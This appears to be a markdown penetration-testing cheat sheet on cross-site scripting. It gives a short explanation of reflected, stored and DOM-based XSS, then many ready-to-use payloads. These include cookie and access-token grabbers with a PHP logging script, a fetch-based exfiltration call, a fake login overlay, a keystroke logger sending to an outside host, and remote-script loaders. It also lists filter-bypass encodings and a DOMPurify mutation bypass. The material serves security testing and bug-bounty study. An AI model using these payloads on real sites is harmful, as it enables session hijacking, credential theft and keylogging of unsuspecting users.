# Cross Site Scripting

> Cross-site scripting (XSS) is a type of computer security vulnerability typically found in web applications. XSS enables attackers to inject client-side scripts into web pages viewed by other users.


## Summary

- [Methodology](#methodology)
- [Proof of Concept](#proof-of-concept)
    - [Data Grabber](#data-grabber)
    - [CORS](#cors)
    - [UI Redressing](#ui-redressing)
    - [Javascript Keylogger](#javascript-keylogger)
    - [Other Ways](#other-ways)
- [Identify an XSS Endpoint](#identify-an-xss-endpoint)
    - [Tools](#tools)
- [XSS in HTML/Applications](#xss-in-htmlapplications)
    - [Common Payloads](#common-payloads)
    - [XSS using HTML5 tags](#xss-using-html5-tags)
    - [XSS using a Remote JS](#xss-using-a-remote-js)
    - [XSS in Hidden Input](#xss-in-hidden-input)
    - [XSS in Uppercase Output](#xss-in-uppercase-output)
    - [DOM Based XSS](#dom-based-xss)
    - [XSS in JS Context](#xss-in-js-context)
- [XSS in Wrappers for URI](#xss-in-wrappers-for-uri)
    - [Wrapper javascript:](#wrapper-javascript)
    - [Wrapper data:](#wrapper-data)
    - [Wrapper vbscript:](#wrapper-vbscript)
- [XSS in Files](#xss-in-files)
    - [XSS in XML](#xss-in-xml)
    - [XSS in SVG](#xss-in-svg)
    - [XSS in Markdown](#xss-in-markdown)
    - [XSS in CSS](#xss-in-css)
- [XSS in PostMessage](#xss-in-postmessage)
- [Blind XSS](#blind-xss)
    - [XSS Hunter](#xss-hunter)
    - [Other Blind XSS tools](#other-blind-xss-tools)
    - [Blind XSS endpoint](#blind-xss-endpoint)
    - [Tips](#tips)
- [Mutated XSS](#mutated-xss)
- [Labs](#labs)
- [References](#references)


## Methodology

Cross-Site Scripting (XSS) is a type of computer security vulnerability typically found in web applications. XSS allows attackers to inject malicious code into a website, which is then executed in the browser of anyone who visits the site. This can allow attackers to steal sensitive information, such as user login credentials, or to perform other malicious actions.

There are 3 main types of XSS attacks:

* **Reflected XSS**: In a reflected XSS attack, the malicious code is embedded in a link that is sent to the victim. When the victim clicks on the link, the code is executed in their browser. For example, an attacker could create a link that contains malicious JavaScript, and send it to the victim in an email. When the victim clicks on the link, the JavaScript code is executed in their browser, allowing the attacker to perform various actions, such as stealing their login credentials.

* **Stored XSS**: In a stored XSS attack, the malicious code is stored on the server, and is executed every time the vulnerable page is accessed. For example, an attacker could inject malicious code into a comment on a blog post. When other users view the blog post, the malicious code is executed in their browsers, allowing the attacker to perform various actions.

* **DOM-based XSS**: is a type of XSS attack that occurs when a vulnerable web application modifies the DOM (Document Object Model) in the user's browser. This can happen, for example, when a user input is used to update the page's HTML or JavaScript code in some way. In a DOM-based XSS attack, the malicious code is not sent to the server, but is instead executed directly in the user's browser. This can make it difficult to detect and prevent these types of attacks, because the server does not have any record of the malicious code.

To prevent XSS attacks, it is important to properly validate and sanitize user input. This means ensuring that all input meets the necessary criteria, and removing any potentially dangerous characters or code. It is also important to escape special characters in user input before rendering it in the browser, to prevent the browser from interpreting it as code.


## Proof of Concept

When exploiting an XSS vulnerability, it’s more effective to demonstrate a complete exploitation scenario that could lead to account takeover or sensitive data exfiltration. Instead of simply reporting an XSS with an alert payload, aim to capture valuable data, such as payment information, personal identifiable information (PII), session cookies, or credentials.


### Data Grabber

Obtains the administrator cookie or sensitive access token, the following payload will send it to a controlled page.

```html
<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>
<script>new Image().src="http://localhost/cookie.php?c="+document.cookie;</script>
<script>new Image().src="http://localhost/cookie.php?c="+localStorage.getItem('access_token');</script>
```

Write the collected data into a file.

```php
<?php
$cookie = $_GET['c'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie."\r\n");
fclose($fp);
?>
```

### CORS

```html
<script>
  fetch('https://<SESSION>.burpcollaborator.net', {
  method: 'POST',
  mode: 'no-cors',
  body: document.cookie
  });
</script>
```

### UI Redressing

Leverage the XSS to modify the HTML content of the page in order to display a fake login form.

```html
<script>
history.replaceState(null, null, '../../../login');
document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue</h1><form>Username: <input type='text'>Password: <input type='password'></form><input value='submit' type='submit'>"
</script>
```

### Javascript Keylogger

Another way to collect sensitive data is to set a javascript keylogger.

```javascript
<img src=x onerror='document.onkeypress=function(e){fetch("http://domain.com?k="+String.fromCharCode(e.which))},this.remove();'>
```

### Other Ways

More exploits at [http://www.xss-payloads.com/payloads-list.html?a#category=all](http://www.xss-payloads.com/payloads-list.html?a#category=all):

- [Taking screenshots using XSS and the HTML5 Canvas](https://www.idontplaydarts.com/2012/04/taking-screenshots-using-xss-and-the-html5-canvas/)
- [JavaScript Port Scanner](http://www.gnucitizen.org/blog/javascript-port-scanner/)
- [Network Scanner](http://www.xss-payloads.com/payloads/scripts/websocketsnetworkscan.js.html)
- [.NET Shell execution](http://www.xss-payloads.com/payloads/scripts/dotnetexec.js.html)
- [Redirect Form](http://www.xss-payloads.com/payloads/scripts/redirectform.js.html)
- [Play Music](http://www.xss-payloads.com/payloads/scripts/playmusic.js.html)


## Identify an XSS Endpoint

This payload opens the debugger in the developer console rather than triggering a popup alert box.

```javascript
<script>debugger;</script>
```

Modern applications with content hosting can use [sandbox domains][sandbox-domains]

> to safely host various types of user-generated content. Many of these sandboxes are specifically meant to isolate user-uploaded HTML, JavaScript, or Flash applets and make sure that they can't access any user data.

[sandbox-domains]:https://security.googleblog.com/2012/08/content-hosting-for-modern-web.html

For this reason, it's better to use `alert(document.domain)` or `alert(window.origin)` rather than `alert(1)` as default XSS payload in order to know in which scope the XSS is actually executing.

Better payload replacing `<script>alert(1)</script>`:

```html
<script>alert(document.domain.concat("\n").concat(window.origin))</script>
```

While `alert()` is nice for reflected XSS it can quickly become a burden for stored XSS because it requires to close the popup for each execution, so `console.log()` can be used instead to display a message in the console of the developer console (doesn't require any interaction).

Example:

```html
<script>console.log("Test XSS from the search bar of page XYZ\n".concat(document.domain).concat("\n").concat(window.origin))</script>
```

References:

- [Google Bughunter University - XSS in sandbox domains](https://sites.google.com/site/bughunteruniversity/nonvuln/xss-in-sandbox-domain)
- [LiveOverflow Video - DO NOT USE alert(1) for XSS](https://www.youtube.com/watch?v=KHwVjzWei1c)
- [LiveOverflow blog post - DO NOT USE alert(1) for XSS](https://liveoverflow.com/do-not-use-alert-1-in-xss/)

### Tools 

Most tools are also suitable for blind XSS attacks:

* [XSSStrike](https://github.com/s0md3v/XSStrike): Very popular but unfortunately not very well maintained
* [xsser](https://github.com/epsylon/xsser): Utilizes a headless browser to detect XSS vulnerabilities
* [Dalfox](https://github.com/hahwul/dalfox): Extensive functionality and extremely fast thanks to the implementation in Go
* [XSpear](https://github.com/hahwul/XSpear): Similar to Dalfox but based on Ruby
* [domdig](https://github.com/fcavallarin/domdig): Headless Chrome XSS Tester

## XSS in HTML/Applications

### Common Payloads

```javascript
// Basic payload
<script>alert('XSS')</script>
<scr<script>ipt>alert('XSS')</scr<script>ipt>
"><script>alert('XSS')</script>
"><script>alert(String.fromCharCode(88,83,83))</script>
<script>\u0061lert('22')</script>
<script>eval('\x61lert(\'33\')')</script>
<script>eval(8680439..toString(30))(983801..toString(36))</script> //parseInt("confirm",30) == 8680439 && 8680439..toString(30) == "confirm"
<object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">

// Img payload
<img src=x onerror=alert('XSS');>
<img src=x onerror=alert('XSS')//
<img src=x onerror=alert(String.fromCharCode(88,83,83));>
<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
<img src=x:alert(alt) onerror=eval(src) alt=xss>
"><img src=x onerror=alert('XSS');>
"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
<><img src=1 onerror=alert(1)>

// Svg payload
<svgonload=alert(1)>
<svg/onload=alert('XSS')>
<svg onload=alert(1)//
<svg/onload=alert(String.fromCharCode(88,83,83))>
<svg id=alert(1) onload=eval(id)>
"><svg/onload=alert(String.fromCharCode(88,83,83))>
"><svg/onload=alert(/XSS/)
<svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)
<svg><script>alert('33')
<svg><script>alert&lpar;'33'&rpar;

// Div payload
<div onpointerover="alert(45)">MOVE HERE</div>
<div onpointerdown="alert(45)">MOVE HERE</div>
<div onpointerenter="alert(45)">MOVE HERE</div>
<div onpointerleave="alert(45)">MOVE HERE</div>
<div onpointermove="alert(45)">MOVE HERE</div>
<div onpointerout="alert(45)">MOVE HERE</div>
<div onpointerup="alert(45)">MOVE HERE</div>
```

### XSS using HTML5 tags

```javascript
<body onload=alert(/XSS/.source)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<video/poster/onerror=alert(1)>
<video><source onerror="javascript:alert(1)">
<video src=_ onloadstart="alert(1)">
<details/open/ontoggle="alert`1`">
<audio src onloadstart=alert(1)>
<marquee onstart=alert(1)>
<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>

<body ontouchstart=alert(1)> // Triggers when a finger touch the screen
<body ontouchend=alert(1)>   // Triggers when a finger is removed from touch screen
<body ontouchmove=alert(1)>  // When a finger is dragged across the screen.
```

### XSS using a remote JS

```html
<svg/onload='fetch("//host/a").then(r=>r.text().then(t=>eval(t)))'>
<script src=14.rs>
// you can also specify an arbitrary payload with 14.rs/#payload
e.g: 14.rs/#alert(document.domain)
```

### XSS in Hidden Input

```javascript
<input type="hidden" accesskey="X" onclick="alert(1)">
Use CTRL+SHIFT+X to trigger the onclick event
```
in newer browsers : firefox-130/chrome-108
```javascript
<input type="hidden" oncontentvisibilityautostatechange="alert(1)"  style="content-visibility:auto" >
```

### XSS in Uppercase Output

```javascript
<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>
```

### DOM Based XSS

Based on a DOM XSS sink.

```javascript
#"><img src=/ onerror=alert(2)>
```

### XSS in JS Context

```javascript
-(confirm)(document.domain)//
; alert(1);//
// (payload without quote/double quote from [@brutelogic](https://twitter.com/brutelogic)
```

## XSS in Wrappers for URI

### Wrapper javascript

```javascript
javascript:prompt(1)

%26%23106%26%2397%26%23118%26%2397%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2358%26%2399%26%23111%26%23110%26%23102%26%23105%26%23114%26%23109%26%2340%26%2349%26%2341

&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#99&#111&#110&#102&#105&#114&#109&#40&#49&#41

We can encode the "javascript:" in Hex/Octal
\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)
\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)
\152\141\166\141\163\143\162\151\160\164\072alert(1)

We can use a 'newline character'
java%0ascript:alert(1)   - LF (\n)
java%09script:alert(1)   - Horizontal tab (\t)
java%0dscript:alert(1)   - CR (\r)

Using the escape character
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)

Using the newline and a comment //
javascript://%0Aalert(1)
javascript://anything%0D%0A%0D%0Awindow.alert(1)
```

### Wrapper data

```javascript
data:text/html,<script>alert(0)</script>
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```

### Wrapper vbscript

only IE

```javascript
vbscript:msgbox("XSS")
```

## XSS in Files

**NOTE:** The XML CDATA section is used here so that the JavaScript payload will not be treated as XML markup.

```xml
<name>
  <value><![CDATA[<script>confirm(document.domain)</script>]]></value>
</name>
```

### XSS in XML

```xml
<html>
<head></head>
<body>
<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
</body>
</html>
```

### XSS in SVG

Simple script. Codename: green triangle

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">
    alert(document.domain);
  </script>
</svg>
```

More comprehensive payload with svg tag attribute, desc script, foreignObject script, foreignObject iframe, title script, animatetransform event and simple script. Codename: red ligthning. Author: noraj.

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" width="100" height="100" xmlns="http://www.w3.org/2000/svg" onload="alert('svg attribut')">
  <polygon id="lightning" points="0,100 50,25 50,75 100,0" fill="#ff1919" stroke="#ff0000"/>
  <desc><script>alert('svg desc')</script></desc>
  <foreignObject><script>alert('svg foreignObject')</script></foreignObject>
  <foreignObject width="500" height="500">
    <iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert('svg foreignObject iframe');" width="400" height="250"/>
  </foreignObject>
  <title><script>alert('svg title')</script></title>
  <animatetransform onbegin="alert('svg animatetransform onbegin')"></animatetransform>
  <script type="text/javascript">
    alert('svg script');
  </script>
</svg>
```



#### Short SVG Payload

```javascript
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>

<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>
<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
```

### Nesting SVG and XSS

Including a remote SVG image in a SVG works but won't trigger the XSS embedded in the remote SVG. Author: noraj.

SVG 1.x (xlink:href)

```xml
<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://127.0.0.1:9999/red_lightning_xss_full.svg" height="200" width="200"/>
</svg>
```

Including a remote SVG fragment in a SVG works but won't trigger the XSS embedded in the remote SVG element because it's impossible to add vulnerable attribute on a polygon/rect/etc since the `style` attribute is no longer a vector on modern browsers. Author: noraj.

SVG 1.x (xlink:href)

```xml
<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <use xlink:href="http://127.0.0.1:9999/red_lightning_xss_full.svg#lightning"/>
</svg>
```

However, including svg tags in SVG documents works and allows XSS execution from sub-SVGs. Codename: french flag. Author: noraj.

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <svg x="10">
    <rect x="10" y="10" height="100" width="100" style="fill: #002654"/>
    <script type="text/javascript">alert('sub-svg 1');</script>
  </svg>
  <svg x="200">
    <rect x="10" y="10" height="100" width="100" style="fill: #ED2939"/>
    <script type="text/javascript">alert('sub-svg 2');</script>
  </svg>
</svg>
```

### XSS in Markdown

```csharp
[a](javascript:prompt(document.cookie))
[a](j a v a s c r i p t:prompt(document.cookie))
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
[a](javascript:window.onerror=alert;throw%201)
```

### XSS in CSS

```html
<!DOCTYPE html>
<html>
<head>
<style>
div  {
    background-image: url("data:image/jpg;base64,<\/style><svg/onload=alert(document.domain)>");
    background-color: #cccccc;
}
</style>
</head>
  <body>
    <div>lol</div>
  </body>
</html>
```

## XSS in PostMessage

> If the target origin is asterisk * the message can be sent to any domain has reference to the child page.

```html
<html>
<body>
    <input type=button value="Click Me" id="btn">
</body>

<script>
document.getElementById('btn').onclick = function(e){
    window.poc = window.open('http://www.redacted.com/#login');
    setTimeout(function(){
        window.poc.postMessage(
            {
                "sender": "accounts",
                "url": "javascript:confirm('XSS')",
            },
            '*'
        );
    }, 2000);
}
</script>
</html>
```

## Blind XSS

### XSS Hunter

> XSS Hunter allows you to find all kinds of cross-site scripting vulnerabilities, including the often-missed blind XSS. The service works by hosting specialized XSS probes which, upon firing, scan the page and send information about the vulnerable page to the XSS Hunter service.

XSS Hunter is deprecated, it was available at [https://xsshunter.com/app](https://xsshunter.com/app). 

You can set up an alternative version 

* Self-hosted version from [mandatoryprogrammer/xsshunter-express](https://github.com/mandatoryprogrammer/xsshunter-express)
* Hosted on [xsshunter.trufflesecurity.com](https://xsshunter.trufflesecurity.com/)

```xml
"><script src="https://js.rip/<custom.name>"></script>
"><script src=//<custom.subdomain>.xss.ht></script>
<script>$.getScript("//<custom.subdomain>.xss.ht")</script>
```

### Other Blind XSS tools

- [Netflix-Skunkworks/sleepy-puppy](https://github.com/Netflix-Skunkworks/sleepy-puppy) - Sleepy Puppy XSS Payload Management Framework
- [LewisArdern/bXSS](https://github.com/LewisArdern/bXSS) - bXSS is a utility which can be used by bug hunters and organizations to identify Blind Cross-Site Scripting. 
- [ssl/ezXSS](https://github.com/ssl/ezXSS) - ezXSS is an easy way for penetration testers and bug bounty hunters to test (blind) Cross Site Scripting. 

### Blind XSS endpoint

- Contact forms
- Ticket support
- Referer Header
  - Custom Site Analytics
  - Administrative Panel logs
- User Agent
  - Custom Site Analytics
  - Administrative Panel logs
- Comment Box
  - Administrative Panel

### Tips

You can use a [Data grabber for XSS](#data-grabber-for-xss) and a one-line HTTP server to confirm the existence of a blind XSS before deploying a heavy blind-XSS testing tool.

Eg. payload

```html
<script>document.location='http://10.10.14.30:8080/XSS/grabber.php?c='+document.domain</script>
```

Eg. one-line HTTP server:

```ps1
$ ruby -run -ehttpd . -p8080
```

## Mutated XSS

Use browsers quirks to recreate some HTML tags.

**Example**: Mutated XSS from Masato Kinugawa, used against [cure53/DOMPurify](https://github.com/cure53/DOMPurify) component on Google Search. 

```javascript
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

Technical blogposts available at

* https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/
* https://research.securitum.com/dompurify-bypass-using-mxss/


## Labs

* [PortSwigger Labs for XSS](https://portswigger.net/web-security/all-labs#cross-site-scripting)
* [Root Me - XSS - Reflected](https://www.root-me.org/en/Challenges/Web-Client/XSS-Reflected)
* [Root Me - XSS - Server Side](https://www.root-me.org/en/Challenges/Web-Server/XSS-Server-Side)
* [Root Me - XSS - Stored 1](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-1)
* [Root Me - XSS - Stored 2](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-2)
* [Root Me - XSS - Stored - Filter Bypass](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-filter-bypass)
* [Root Me - XSS DOM Based - Introduction](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Introduction)
* [Root Me - XSS DOM Based - AngularJS](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-AngularJS)
* [Root Me - XSS DOM Based - Eval](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Eval)
* [Root Me - XSS DOM Based - Filters Bypass](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Filters-Bypass)
* [Root Me - XSS - DOM Based](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based)
* [Root Me - Self XSS - DOM Secrets](https://www.root-me.org/en/Challenges/Web-Client/Self-XSS-DOM-Secrets)
* [Root Me - Self XSS - Race Condition](https://www.root-me.org/en/Challenges/Web-Client/Self-XSS-Race-Condition)


## References

- [Abusing XSS Filter: One ^ leads to XSS(CVE-2016-3212) - Masato Kinugawa's (@kinugawamasato) - July 15, 2016](http://mksben.l0.cm/2016/07/xxn-caret.html)
- [Account Recovery XSS - Gábor Molnár - April 13, 2016](https://sites.google.com/site/bughunteruniversity/best-reports/account-recovery-xss)
- [An XSS on Facebook via PNGs & Wonky Content Types - Jack Whitton (@fin1te) - January 27, 2016](https://whitton.io/articles/xss-on-facebook-via-png-content-types/)
- [Bypassing Signature-Based XSS Filters: Modifying Script Code - PortSwigger - August 4, 2020](https://portswigger.net/support/bypassing-signature-based-xss-filters-modifying-script-code)
- [Combination of techniques lead to DOM Based XSS in Google - Sasi Levi - September 19, 2016](http://sasi2103.blogspot.sg/2016/09/combination-of-techniques-lead-to-dom.html)
- [Cross-site scripting (XSS) cheat sheet - PortSwigger - September 27, 2019](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [Encoding Differentials: Why Charset Matters - Stefan Schiller - July 15, 2024](https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/)
- [Facebook's Moves - OAuth XSS - Paulos Yibelo - December 10, 2015](http://www.paulosyibelo.com/2015/12/facebooks-moves-oauth-xss.html)
- [Frans Rosén on how he got Bug Bounty for Mega.co.nz XSS - Frans Rosén - February 14, 2013](https://labs.detectify.com/2013/02/14/how-i-got-the-bug-bounty-for-mega-co-nz-xss/)
- [Google XSS Turkey - Frans Rosén - June 6, 2015](https://labs.detectify.com/2015/06/06/google-xss-turkey/)
- [How I found a $5,000 Google Maps XSS (by fiddling with Protobuf) - Marin Moulinier - March 9, 2017](https://medium.com/@marin_m/how-i-found-a-5-000-google-maps-xss-by-fiddling-with-protobuf-963ee0d9caff#.cktt61q9g)
- [Killing a bounty program, Twice - Itzhak (Zuk) Avraham and Nir Goldshlager - May 2012](http://conference.hitb.org/hitbsecconf2012ams/materials/D1T2%20-%20Itzhak%20Zuk%20Avraham%20and%20Nir%20Goldshlager%20-%20Killing%20a%20Bug%20Bounty%20Program%20-%20Twice.pdf)
- [mXSS Attacks: Attacking well-secured Web-Applications by using innerHTML Mutations - Mario Heiderich, Jörg Schwenk, Tilman Frosch, Jonas Magazinius, Edward Z. Yang - September 26, 2013](https://cure53.de/fp170.pdf)
- [postMessage XSS on a million sites - Mathias Karlsson - December 15, 2016](https://labs.detectify.com/2016/12/15/postmessage-xss-on-a-million-sites/)
- [RPO that lead to information leakage in Google - @filedescriptor - July 3, 2016](https://web.archive.org/web/20220521125028/https://blog.innerht.ml/rpo-gadgets/)
- [Secret Web Hacking Knowledge: CTF Authors Hate These Simple Tricks - Philippe Dourassov - May 13, 2024](https://youtu.be/Sm4G6cAHjWM)
- [Stealing contact form data on www.hackerone.com using Marketo Forms XSS with postMessage frame-jumping and jQuery-JSONP - Frans Rosén (fransrosen) - February 17, 2017](https://hackerone.com/reports/207042)
- [Stored XSS affecting all fantasy sports [*.fantasysports.yahoo.com] - thedawgyg - December 7, 2016](https://web.archive.org/web/20161228182923/http://dawgyg.com/2016/12/07/stored-xss-affecting-all-fantasy-sports-fantasysports-yahoo-com-2/)
- [Stored XSS in *.ebay.com - Jack Whitton (@fin1te) - January 27, 2013](https://whitton.io/archive/persistent-xss-on-myworld-ebay-com/)
- [Stored XSS In Facebook Chat, Check In, Facebook Messenger - Nirgoldshlager - April 17, 2013](http://web.archive.org/web/20130420095223/http://www.breaksec.com/?p=6129)
- [Stored XSS on developer.uber.com via admin account compromise in Uber - James Kettle (@albinowax) - July 18, 2016](https://hackerone.com/reports/152067)
- [Stored XSS on Snapchat - Mrityunjoy - February 9, 2018](https://medium.com/@mrityunjoy/stored-xss-on-snapchat-5d704131d8fd)
- [Stored XSS, and SSRF in Google using the Dataset Publishing Language - Craig Arendt - March 7, 2018](https://s1gnalcha0s.github.io/dspl/2018/03/07/Stored-XSS-and-SSRF-Google.html)
- [Tricky HTML Injection and Possible XSS in sms-be-vip.twitter.com - Ahmed Aboul-Ela (@aboul3la) - July 9, 2016](https://hackerone.com/reports/150179)
- [Twitter XSS by stopping redirection and javascript scheme - Sergey Bobrov (bobrov) - September 30, 2017](https://hackerone.com/reports/260744)
- [Uber Bug Bounty: Turning Self-XSS into Good XSS - Jack Whitton (@fin1te) - March 22, 2016](https://whitton.io/articles/uber-turning-self-xss-into-good-xss/)
- [Uber Self XSS to Global XSS - httpsonly - August 29, 2016](https://httpsonly.blogspot.hk/2016/08/turning-self-xss-into-good-xss-v2.html)
- [Unleashing an Ultimate XSS Polyglot - Ahmed Elsobky - February 16, 2018](https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)
- [Using a Braun Shaver to Bypass XSS Audit and WAF - Frans Rosen - April 19, 2016](http://web.archive.org/web/20160810033728/https://blog.bugcrowd.com/guest-blog-using-a-braun-shaver-to-bypass-xss-audit-and-waf-by-frans-rosen-detectify)
- [Ways to alert(document.domain) - Tom Hudson (@tomnomnom) - February 22, 2018](https://gist.github.com/tomnomnom/14a918f707ef0685fdebd90545580309)
- [XSS by Tossing Cookies - WeSecureApp - July 10, 2017](https://wesecureapp.com/blog/xss-by-tossing-cookies/)
- [XSS ghettoBypass - d3adend - September 25, 2015](http://d3adend.org/xss/ghettoBypass)
- [XSS in Uber via Cookie - zhchbin - August 30, 2017](http://zhchbin.github.io/2017/08/30/Uber-XSS-via-Cookie/)
- [XSS on any Shopify shop via abuse of the HTML5 structured clone algorithm in postMessage listener - Luke Young (bored-engineer) - May 23, 2017](https://hackerone.com/reports/231053)
- [XSS via Host header - www.google.com/cse - Michał Bentkowski - April 22, 2015](http://blog.bentkowski.info/2015/04/xss-via-host-header-cse.html)
- [Xssing Web With Unicodes - Rakesh Mane - August 3, 2017](http://blog.rakeshmane.com/2017/08/xssing-web-part-2.html)
- [Yahoo Mail stored XSS - Jouko Pynnönen - January 19, 2016](https://klikki.fi/adv/yahoo.html)
- [Yahoo Mail stored XSS #2 - Jouko Pynnönen - December 8, 2016](https://klikki.fi/adv/yahoo2.html)